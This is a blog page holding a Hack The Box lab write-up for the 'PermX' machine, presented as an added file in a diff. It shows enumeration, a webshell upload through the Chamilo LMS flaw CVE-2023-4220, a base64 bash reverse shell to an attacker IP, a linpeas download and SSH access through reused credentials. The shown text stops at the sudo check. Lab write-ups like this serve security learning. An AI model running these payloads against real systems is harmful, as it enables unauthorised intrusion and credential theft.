@@ -1,0 +1,317 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PermX Writeup HTB - Astro boilerplate</title><meta name="description" content="Steps taken to compromise the &#34;Permx&#34; box from htb, the lab was straightforward and very beginner friendly."><meta name="author" content="Roqeeb"><link rel="alternate" type="application/rss+xml" href="/rss.xml"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="/_astro/index.CvLV1VIh.css" /></head> <body class="bg-slate-900 text-gray-100"> <div class="mx-auto max-w-screen-lg px-3 py-6"><div class="flex flex-col gap-y-3 sm:flex-row sm:items-center sm:justify-between"><a href="/"><div class="flex items-center bg-gradient-to-br from-sky-500 to-cyan-400 bg-clip-text text-xl font-bold text-transparent"><svg class="mr-1 h-10 w-10 stroke-cyan-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M0 0h24v24H0z" stroke="none"></path><rect x="3" y="12" width="6" height="8" rx="1"></rect><rect x="9" y="8" width="6" height="12" rx="1"></rect><rect x="15" y="4" width="6" height="16" rx="1"></rect><path d="M4 20h14"></path></svg>Roqeeb&#x27;s Blog</div></a><nav><ul class="flex gap-x-3 font-medium text-gray-200"><li class="hover:text-white"><a href="/posts/" target="_self">Blogs</a></li><li class="hover:text-white"><a href="/posts/" target="_self">Writeups</a></li><li class="hover:text-white"><a href="https://x.com/FireEyesOMG" target="_blank">Twitter</a></li><li class="hover:text-white"><a href="https://github.com/0xRoqeeb" target="_blank">Github</a></li></ul></nav></div></div>  <div class="mx-auto max-w-screen-lg px-3 py-6"><h1 class="text-center text-3xl font-bold">PermX Writeup HTB</h1><div class="mt-2 text-center text-sm text-gray-400">By <!-- -->Roqeeb<!-- --> on<!-- --> <!-- -->Mar 2, 2020</div><div class="mx-auto mt-5 "><div class="aspect-w-3 aspect-h-2"><img class="h-full w-full rounded-lg object-cover object-center" src="/assets/images/permxup.png" alt="Image post 5" loading="lazy"/></div><div class="prose prose-invert mt-8 prose-img:rounded-lg"> <h1 id="permx-write-up">PermX Write-up</h1>
+<p>by Roqeeb</p>
+<h2 id="introduction">Introduction</h2>
+<p>In this write-up, i covered the steps taken to compromise the “Permx” box from htb, the lab was straightforward and very beginner friendly ,this is a writeup of how i exploited it</p>
+<h3 id="target-overview">Target Overview</h3>
+<ul>
+<li><strong>Box Name:</strong> Permx</li>
+<li><strong>Difficulty</strong> Easy</li>
+<li><strong>IP Address:</strong> 10.10.11.23</li>
+<li></li>
+</ul>
+<p>This write-up is intended for educational purposes and to provide insight into the methodology used during the penetration testing process.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap-scan">Nmap Scan</h3>
+<p>To start the enumeration, i used rustscan to identify open ports and services running on the target machine.</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">rustscan</span><span style="color:#AE81FF"> -a</span><span style="color:#AE81FF"> -t</span><span style="color:#AE81FF"> 2000</span><span style="color:#E6DB74"> permx.htb</span><span style="color:#AE81FF"> --</span><span style="color:#AE81FF"> -sC</span><span style="color:#AE81FF"> -sV</span><span style="color:#AE81FF"> -oA</span><span style="color:#E6DB74"> nmap</span><span style="color:#AE81FF"> -Pn</span></span>
+<span class="line"><span style="color:#A6E22E">Open</span><span style="color:#AE81FF"> 10.10</span><span style="color:#E6DB74">.11.23:22</span></span>
+<span class="line"><span style="color:#A6E22E">Open</span><span style="color:#AE81FF"> 10.10</span><span style="color:#E6DB74">.11.23:80</span></span>
+<span class="line"><span style="color:#F8F8F2">[~] Starting Nmap</span></span>
+<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#F92672">></span><span style="color:#F8F8F2">] The Nmap command to be run is nmap -sC -sV -oA nmap -Pn -vvv -p 22,80 10.10.11.23</span></span>
+<span class="line"><span style="color:#A6E22E">PORT</span><span style="color:#E6DB74">   STATE</span><span style="color:#E6DB74"> SERVICE</span><span style="color:#E6DB74"> REASON</span><span style="color:#E6DB74">  VERSION</span></span>
+<span class="line"><span style="color:#A6E22E">22/tcp</span><span style="color:#E6DB74"> open</span><span style="color:#E6DB74">  ssh</span><span style="color:#E6DB74">     syn-ack</span><span style="color:#E6DB74"> OpenSSH</span><span style="color:#AE81FF"> 8.9</span><span style="color:#E6DB74">p1</span><span style="color:#E6DB74"> Ubuntu</span><span style="color:#AE81FF"> 3</span><span style="color:#E6DB74">ubuntu0.10</span><span style="color:#F8F8F2"> (Ubuntu </span><span style="color:#E6DB74">Linux</span><span style="color:#F8F8F2">; </span><span style="color:#A6E22E">protocol</span><span style="color:#AE81FF"> 2.0</span><span style="color:#F8F8F2">)</span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E"> ssh-hostkey:</span><span style="color:#F8F8F2"> </span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">   256</span><span style="color:#E6DB74"> e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef</span><span style="color:#F8F8F2"> (ECDSA)</span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E"> ecdsa-sha2-nistp256</span><span style="color:#E6DB74"> AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=</span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">   256</span><span style="color:#AE81FF"> 1</span><span style="color:#E6DB74">f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17</span><span style="color:#F8F8F2"> (ED25519)</span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">_ssh-ed25519</span><span style="color:#E6DB74"> AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI</span></span>
+<span class="line"><span style="color:#A6E22E">80/tcp</span><span style="color:#E6DB74"> open</span><span style="color:#E6DB74">  http</span><span style="color:#E6DB74">    syn-ack</span><span style="color:#E6DB74"> Apache</span><span style="color:#E6DB74"> httpd</span><span style="color:#AE81FF"> 2.4</span><span style="color:#E6DB74">.52</span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E"> http-methods:</span><span style="color:#F8F8F2"> </span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">_</span><span style="color:#E6DB74">  Supported</span><span style="color:#E6DB74"> Methods:</span><span style="color:#E6DB74"> OPTIONS</span><span style="color:#E6DB74"> HEAD</span><span style="color:#E6DB74"> GET</span><span style="color:#E6DB74"> POST</span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">_http-title:</span><span style="color:#E6DB74"> eLEARNING</span></span>
+<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">_http-server-header:</span><span style="color:#E6DB74"> Apache/2.4.52</span><span style="color:#F8F8F2"> (Ubuntu)</span></span>
+<span class="line"><span style="color:#A6E22E">Service</span><span style="color:#E6DB74"> Info:</span><span style="color:#E6DB74"> Host:</span><span style="color:#AE81FF"> 127.0</span><span style="color:#E6DB74">.0.1</span><span style="color:#F8F8F2">; </span><span style="color:#A6E22E">OS:</span><span style="color:#E6DB74"> Linux</span><span style="color:#F8F8F2">; </span><span style="color:#A6E22E">CPE:</span><span style="color:#E6DB74"> cpe:/o:linux:linux_kernel</span></span></code></pre>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>To find directories and files on the web server, I ran Gobuster. This tool helps to brute-force directories and files, which is handy for discovering hidden resources.</p>
+<p><strong>Command:</strong></p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">gobuster</span><span style="color:#E6DB74"> dir</span><span style="color:#AE81FF"> -u</span><span style="color:#E6DB74"> http://permx.htb/</span><span style="color:#AE81FF"> -w</span><span style="color:#E6DB74"> /home/mofe/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#AE81FF"> -t</span><span style="color:#AE81FF"> 16</span><span style="color:#AE81FF"> -x</span><span style="color:#E6DB74"> php,txt,html,zip</span></span>
+<span class="line"><span style="color:#F8F8F2">===============================================================</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] Url:                     http://permx.htb/</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] Method:                  GET</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] Threads:                 16</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] Wordlist:                /home/mofe/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] Negative Status codes:   404</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] User Agent:              gobuster/3.6</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] Extensions:              txt,html,zip,php</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] Timeout:                 10s</span></span>
+<span class="line"><span style="color:#F8F8F2">===============================================================</span></span>
+<span class="line"><span style="color:#A6E22E">Starting</span><span style="color:#E6DB74"> gobuster</span><span style="color:#E6DB74"> in</span><span style="color:#E6DB74"> directory</span><span style="color:#E6DB74"> enumeration</span><span style="color:#E6DB74"> mode</span></span>
+<span class="line"><span style="color:#F8F8F2">===============================================================</span></span>
+<span class="line"><span style="color:#A6E22E">/.html</span><span style="color:#F8F8F2">                (Status: </span><span style="color:#AE81FF">403</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">274</span><span style="color:#F8F8F2">]</span></span>
+<span class="line"><span style="color:#A6E22E">/.php</span><span style="color:#F8F8F2">                 (Status: </span><span style="color:#AE81FF">403</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">274</span><span style="color:#F8F8F2">]</span></span>
+<span class="line"><span style="color:#A6E22E">/index.html</span><span style="color:#F8F8F2">           (Status: </span><span style="color:#AE81FF">200</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">36182</span><span style="color:#F8F8F2">]</span></span>
+<span class="line"><span style="color:#A6E22E">/contact.html</span><span style="color:#F8F8F2">         (Status: </span><span style="color:#AE81FF">200</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">14753</span><span style="color:#F8F8F2">]</span></span>
+<span class="line"><span style="color:#A6E22E">/about.html</span><span style="color:#F8F8F2">           (Status: </span><span style="color:#AE81FF">200</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">20542</span><span style="color:#F8F8F2">]</span></span>
+<span class="line"><span style="color:#A6E22E">/img</span><span style="color:#F8F8F2">                  (Status: </span><span style="color:#AE81FF">301</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">304</span><span style="color:#F8F8F2">] [--</span><span style="color:#F92672">></span><span style="color:#F8F8F2"> http://permx.htb/img/]</span></span>
+<span class="line"><span style="color:#A6E22E">/css</span><span style="color:#F8F8F2">                  (Status: </span><span style="color:#AE81FF">301</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">304</span><span style="color:#F8F8F2">] [--</span><span style="color:#F92672">></span><span style="color:#F8F8F2"> http://permx.htb/css/]</span></span>
+<span class="line"><span style="color:#A6E22E">/courses.html</span><span style="color:#F8F8F2">         (Status: </span><span style="color:#AE81FF">200</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">22993</span><span style="color:#F8F8F2">]</span></span>
+<span class="line"><span style="color:#A6E22E">/team.html</span><span style="color:#F8F8F2">            (Status: </span><span style="color:#AE81FF">200</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">14806</span><span style="color:#F8F8F2">]</span></span>
+<span class="line"><span style="color:#A6E22E">/lib</span><span style="color:#F8F8F2">                  (Status: </span><span style="color:#AE81FF">301</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">304</span><span style="color:#F8F8F2">] [--</span><span style="color:#F92672">></span><span style="color:#F8F8F2"> http://permx.htb/lib/]</span></span>
+<span class="line"><span style="color:#A6E22E">/js</span><span style="color:#F8F8F2">                   (Status: </span><span style="color:#AE81FF">301</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">303</span><span style="color:#F8F8F2">] [--</span><span style="color:#F92672">></span><span style="color:#F8F8F2"> http://permx.htb/js/]</span></span>
+<span class="line"><span style="color:#A6E22E">/404.html</span><span style="color:#F8F8F2">             (Status: </span><span style="color:#AE81FF">200</span><span style="color:#F8F8F2">) [Size: </span><span style="color:#AE81FF">10428</span><span style="color:#F8F8F2">]</span></span></code></pre>
+<p>going through the pages of permx.htb and proxying the traffic through burpsuite i didnt find any vulnerabilty i could exploit so moving ahead to subdomain enumeration</p>
+<h3 id="subdomain-enumeration-with-wfuzz">Subdomain Enumeration with Wfuzz</h3>
+<p>For subdomain enumeration, I used Wfuzz to brute-force potential subdomains. This helped to find hidden or less obvious parts of the application that might be running on different subdomains.</p>
+<p><strong>Command:</strong></p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E"> wfuzz</span><span style="color:#AE81FF"> -c</span><span style="color:#AE81FF"> -w</span><span style="color:#E6DB74"> /home/mofe/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span><span style="color:#AE81FF"> -H</span><span style="color:#E6DB74"> "Host: FUZZ.permx.htb"</span><span style="color:#AE81FF"> --hc</span><span style="color:#AE81FF"> 302</span><span style="color:#E6DB74">  http://permx.htb</span></span>
+<span class="line"><span style="color:#F92672">********************************************************</span></span>
+<span class="line"><span style="color:#F92672">*</span><span style="color:#F8F8F2"> Wfuzz 3.1.0 - The Web Fuzzer                         </span><span style="color:#F92672">*</span></span>
+<span class="line"><span style="color:#F92672">********************************************************</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A6E22E">Target:</span><span style="color:#E6DB74"> http://permx.htb/</span></span>
+<span class="line"><span style="color:#A6E22E">Total</span><span style="color:#E6DB74"> requests:</span><span style="color:#AE81FF"> 4989</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">=====================================================================</span></span>
+<span class="line"><span style="color:#A6E22E">ID</span><span style="color:#E6DB74">           Response</span><span style="color:#E6DB74">   Lines</span><span style="color:#E6DB74">    Word</span><span style="color:#E6DB74">       Chars</span><span style="color:#E6DB74">       Payload</span><span style="color:#F8F8F2">         </span></span>
+<span class="line"><span style="color:#F8F8F2">=====================================================================</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A6E22E">000000001:</span><span style="color:#AE81FF">   200</span><span style="color:#AE81FF">        586</span><span style="color:#E6DB74"> L</span><span style="color:#AE81FF">    2466</span><span style="color:#E6DB74"> W</span><span style="color:#AE81FF">     36182</span><span style="color:#E6DB74"> Ch</span><span style="color:#E6DB74">    "www"</span><span style="color:#F8F8F2">           </span></span>
+<span class="line"><span style="color:#A6E22E">000000477:</span><span style="color:#AE81FF">   200</span><span style="color:#AE81FF">        352</span><span style="color:#E6DB74"> L</span><span style="color:#AE81FF">    940</span><span style="color:#E6DB74"> W</span><span style="color:#AE81FF">      19347</span><span style="color:#E6DB74"> Ch</span><span style="color:#E6DB74">    "lms"</span><span style="color:#F8F8F2">       </span></span>
+<span class="line"><span style="color:#A6E22E">Total</span><span style="color:#E6DB74"> time:</span><span style="color:#AE81FF"> 100.2279</span></span>
+<span class="line"><span style="color:#A6E22E">Processed</span><span style="color:#E6DB74"> Requests:</span><span style="color:#AE81FF"> 4989</span></span>
+<span class="line"><span style="color:#A6E22E">Filtered</span><span style="color:#E6DB74"> Requests:</span><span style="color:#AE81FF"> 4987</span></span>
+<span class="line"><span style="color:#A6E22E">Requests/sec.:</span><span style="color:#AE81FF"> 49.77654</span></span>
+<span class="line"><span style="color:#A6E22E">---</span></span></code></pre>
+<p>we were able to discover 2 submaoins www and lms, the only thing we need is lms</p>
+<h4 id="adding-subdomain-and-initial-exploitation">Adding Subdomain and Initial Exploitation</h4>
+<p>Adding <code>lms.permx.htb</code> to Hosts File</p>
+<p>First, I added the subdomain <code>lms.permx.htb</code> to my hosts file to access the application running on that subdomain.
+After adding the subdomain, I navigated to <a href="http://lms.permx.htb">http://lms.permx.htb</a> and found a login form for Chamilo LMS.
+<img src="https://github.com/user-attachments/assets/181022bc-32a2-4e83-bd0d-6a5d9fb8bd6f" alt="login chamilo"></p>
+<p>I tried default credentials and tested for SQL injection/ other vulnerabilities, but didn’t have much luck. I then searched online for known exploits for Chamilo LMS.</p>
+<p>Unable to get the version number, I decided to try various exploits that I found. Eventually, I came across an exploit that worked:</p>
+<h4 id="vulnerability-overview-cve-2023-4220">Vulnerability Overview: CVE-2023-4220</h4>
+<p>CVE-2023-4220 is a critical RCE vulnerability in Chamilo LMS that allows unauthenticated attackers to upload malicious files and execute arbitrary commands on the server.</p>
+<h2 id="proof-of-concept-cve-2023-4220">Proof of Concept: CVE-2023-4220</h2>
+<h3 id="poc-tool">PoC Tool</h3>
+<p>I used the PoC from the following GitHub repository to exploit CVE-2023-4220:
+<a href="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc">Chamilo LMS Unauthenticated Big Upload RCE PoC</a></p>
+<h3 id="script-usage">Script Usage</h3>
+<p>The script requires the target URL with Chamilo’s root path (e.g., <code>http://example.com/chamilo</code>, <code>http://example.com</code>, or <code>http://chamilo.example.com</code>) and an action to perform. It supports three actions:</p>
+<ul>
+<li><strong>scan</strong>: Checks if the target is vulnerable.</li>
+<li><strong>webshell</strong>: Creates a web shell for further exploitation.</li>
+<li><strong>revshell</strong>: Opens a reverse shell directly.</li>
+</ul>
+<p>to check if the target is vulnerable:</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">python3</span><span style="color:#E6DB74"> poc.py</span><span style="color:#AE81FF"> -u</span><span style="color:#E6DB74"> http://lms.permx.htb</span><span style="color:#AE81FF"> -a</span><span style="color:#E6DB74"> scan</span></span>
+<span class="line"><span style="color:#F8F8F2">[+] Target is likely vulnerable. Go ahead. [+]</span></span></code></pre>
+<p>i got a positive response indicating the webapp might be vulnerable</p>
+<h2 id="exploiting-the-vulnerability">Exploiting the Vulnerability</h2>
+<p>Since the web service was found to be vulnerable, I proceeded to exploit it by creating a web shell.</p>
+<ol>
+<li><strong>Run the PoC Script</strong>: I used the PoC tool to upload a web shell. The command was:
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">python3</span><span style="color:#E6DB74"> poc.py</span><span style="color:#AE81FF"> -u</span><span style="color:#E6DB74"> http://lms.permx.htb</span><span style="color:#AE81FF"> -a</span><span style="color:#E6DB74"> webshell</span></span></code></pre>
+</li>
+</ol>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>Enter the name of the webshell file that will be placed on the target server (default: webshell.php): bam</span></span></code></pre>
+<p>i was asked to chose a name for the webshell so i chose a random name “bam”</p>
+<p>after that the websell was created and i was given the url to access it</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2">[+] Upload successfull [+]</span></span>
+<span class="line"><span style="color:#A6E22E">Webshell</span><span style="color:#E6DB74"> URL:</span><span style="color:#E6DB74"> http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=</span><span style="color:#F92672">&#x3C;</span><span style="color:#E6DB74">comman</span><span style="color:#F8F8F2">d</span><span style="color:#F92672">></span></span></code></pre>
+<p>testing it the webshell works</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=id </span></span>
+<span class="line"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span>
+<span class="line"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></code></pre>
+<h3 id="obtaining-a-reverse-shell">Obtaining a Reverse Shell</h3>
+<p>To gain access to the system, I used the ncreated web shell to execute a reverse shell payload.</p>
+<ol>
+<li><strong>Execute the Payload</strong>: I crafted a <code>curl</code> command to send a base64-encoded payload to the web shell. The payload was decoded and executed via the web shell. The command used was:
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">curl</span><span style="color:#E6DB74"> "http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=echo+'YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOS80NDQ0IDA%2bJjE%3d'+|base64+-d+|bash"</span></span></code></pre>
+</li>
+</ol>
+<p>edit the base64 payload to your own ip adress
+<strong>Result</strong></p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">nc</span><span style="color:#AE81FF"> -lnvp</span><span style="color:#AE81FF"> 4444</span></span>
+<span class="line"><span style="color:#A6E22E">listening</span><span style="color:#E6DB74"> on</span><span style="color:#F8F8F2"> [any] 4444 ...</span></span>
+<span class="line"><span style="color:#A6E22E">connect</span><span style="color:#E6DB74"> to</span><span style="color:#F8F8F2"> [10.10.14.29] from (</span><span style="color:#A6E22E">UNKNOWN</span><span style="color:#F8F8F2">) [</span><span style="color:#AE81FF">10.10</span><span style="color:#F8F8F2">.11.23] 34924</span></span>
+<span class="line"><span style="color:#A6E22E">bash:</span><span style="color:#E6DB74"> cannot</span><span style="color:#E6DB74"> set</span><span style="color:#E6DB74"> terminal</span><span style="color:#E6DB74"> process</span><span style="color:#E6DB74"> group</span><span style="color:#F8F8F2"> (1192): Inappropriate ioctl </span><span style="color:#F92672">for</span><span style="color:#F8F8F2"> device</span></span>
+<span class="line"><span style="color:#A6E22E">bash:</span><span style="color:#E6DB74"> no</span><span style="color:#E6DB74"> job</span><span style="color:#E6DB74"> control</span><span style="color:#E6DB74"> in</span><span style="color:#E6DB74"> this</span><span style="color:#E6DB74"> shell</span></span>
+<span class="line"><span style="color:#A6E22E">www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$</span><span style="color:#F8F8F2"> </span></span></code></pre>
+<h3 id="upgrading-the-shell">Upgrading the Shell</h3>
+<p>Once I had a reverse shell, I upgraded it to a more stable interactive shell for better control.</p>
+<ol>
+<li><strong>Upgrade Shell</strong>: I used a Python one-liner to upgrade the shell to a more interactive and functional state:
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">python</span><span style="color:#AE81FF"> -c</span><span style="color:#E6DB74"> 'import pty; pty.spawn("/bin/bash")'</span></span></code></pre>
+</li>
+</ol>
+<p>Background Shell: To regain control over my terminal, I sent the shell to the background with Ctrl+Z.</p>
+<p>Reattach and Fix Terminal: I then reattached the shell using fg and fixed the terminal settings:</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$</span><span style="color:#E6DB74">  python3</span><span style="color:#AE81FF"> -c</span><span style="color:#E6DB74"> 'import pty; pty.spawn("/bin/bash")'</span></span>
+<span class="line"><span style="color:#F92672">&#x3C;</span><span style="color:#F8F8F2">s$  python3 -c </span><span style="color:#E6DB74">'import pty; pty.spawn("/bin/bash")'</span><span style="color:#F8F8F2">                     </span></span>
+<span class="line"><span style="color:#A6E22E">www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$</span><span style="color:#E6DB74"> ^Z</span></span>
+<span class="line"><span style="color:#A6E22E">zsh:</span><span style="color:#E6DB74"> suspended</span><span style="color:#E6DB74">  nc</span><span style="color:#AE81FF"> -lnvp</span><span style="color:#AE81FF"> 4444</span></span>
+<span class="line"><span style="color:#F8F8F2">                                                                                                                                                                      </span></span>
+<span class="line"><span style="color:#A6E22E">┌──(mofe㉿mofe</span><span style="color:#F8F8F2">)-[~]</span></span>
+<span class="line"><span style="color:#A6E22E">└─$</span><span style="color:#E6DB74"> stty</span><span style="color:#E6DB74"> raw</span><span style="color:#AE81FF"> -echo</span><span style="color:#F8F8F2"> ; </span><span style="color:#66D9EF">fg</span><span style="color:#F8F8F2">          </span></span>
+<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">1</span><span style="color:#F8F8F2">]  + continued  nc -lnvp 4444</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F92672">&#x3C;</span><span style="color:#F8F8F2">c/lib/javascript/bigupload/files$ export TERM=xterm                     </span></span>
+<span class="line"><span style="color:#A6E22E">www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$</span><span style="color:#F8F8F2"> </span></span></code></pre>
+<p>now we have a fully interactive shell
+i being enumeration for privesc</p>
+<hr>
+<p>after manually browsing through config files looking for creds or any other information i can leverage i decided it’s time to download
+‘linpeash.sh’ onto the box</p>
+<h3 id="downloading-linpeassh-using-a-python-web-server">Downloading linpeas.sh Using a Python Web Server</h3>
+<p>To transfer <code>linpeas.sh</code> from my local PC to the target machine, I used a Python web server. Here are the steps I followed:</p>
+<ol>
+<li><strong>Start Python Web Server on Local PC</strong>:
+On your local PC, navigate to the directory where <code>linpeas.sh</code> is located and start a Python HTTP server to serve the file:
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">python3</span><span style="color:#AE81FF"> -m</span><span style="color:#E6DB74"> http.server</span><span style="color:#AE81FF"> 8000</span><span style="color:#E6DB74">```</span></span></code></pre>
+</li>
+</ol>
+<p>Download linpeas.sh on Target Machine</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">wget</span><span style="color:#E6DB74"> http://</span><span style="color:#F92672">&#x3C;</span><span style="color:#E6DB74">your-i</span><span style="color:#F8F8F2">p</span><span style="color:#F92672">></span><span style="color:#E6DB74">:8000/linpeas.sh</span></span></code></pre>
+<p>Make the linpeas.sh script executable:
+‘chmod +x linpeas.sh’ then run linpease.sh with ‘./linpeas.sh’</p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>After running <code>linpeas.sh</code> and reviewing the results, several items caught my attention:</p>
+<ul>
+<li>
+<p><strong>Vhost Configuration Files</strong>: The configuration files contained some addresses that might be useful.</p>
+</li>
+<li>
+<p><img src="https://github.com/user-attachments/assets/0c7748d0-9df1-4e36-a3be-07e5e9cdbf00" alt="intressant1">    <img src="https://github.com/user-attachments/assets/462a899c-e2ff-46d4-8bd8-b639d86bf3af" alt="interassant2"></p>
+</li>
+<li>
+<p><strong>FTP Credentials</strong>: Found FTP credentials that could potentially be used for accessing files.</p>
+</li>
+<li>
+<p><img src="https://github.com/user-attachments/assets/701045cf-4944-4e03-8294-87e0bf3e341a" alt="ftpcreds"></p>
+</li>
+<li>
+<p><strong>MongoDB Link</strong>: Discovered a link to MongoDB that might be leveraged for further access.</p>
+</li>
+<li>
+<p><strong>Database Password</strong>: Identified a database password that could be useful for accessing services or further escalation.</p>
+</li>
+</ul>
+<p>I decided to follow the easier path of trying the found passwords for passwprd reuse:
+<img src="https://github.com/user-attachments/assets/e538fa1a-df49-46bd-8ab2-9f056223d77d" alt="configpass"></p>
+<ol>
+<li>
+<p><strong>Attempting Password Reuse</strong>:</p>
+<ul>
+<li><strong>FTP Credentials</strong>: Used the found FTP credentials to access the FTP service.</li>
+<li><strong>Database Password</strong>: Tried the database password for various services to check for password reuse.</li>
+</ul>
+</li>
+<li>
+<p><strong>Successful Escalation</strong>:</p>
+<ul>
+<li>The database password worked for logging in via SSH, allowing me to access the <code>mtz</code> user account.</li>
+</ul>
+</li>
+</ol>
+<p>This approach enabled me to escalate privileges and gain access to the <code>mtz</code> user.</p>
+<h3 id="privilege-escalation-to-root">Privilege Escalation to root</h3>
+<p>After logging in as the <code>mtz</code> user via SSH, the first step was to check which sudo commands could be run. The result showed that <code>mtz</code> had permission to run <code>/opt/acl.sh</code> with <code>sudo</code> without a password.</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">mtz@permx:~$</span><span style="color:#E6DB74"> sudo</span><span style="color:#AE81FF"> -l</span></span>
+<span class="line"><span style="color:#A6E22E">Matching</span><span style="color:#E6DB74"> Defaults</span><span style="color:#E6DB74"> entries</span><span style="color:#E6DB74"> for</span><span style="color:#E6DB74"> mtz</span><span style="color:#E6DB74"> on</span><span style="color:#E6DB74"> permx:</span></span>
+<span class="line"><span style="color:#A6E22E">    env_reset,</span><span style="color:#E6DB74"> mail_badpass,</span></span>
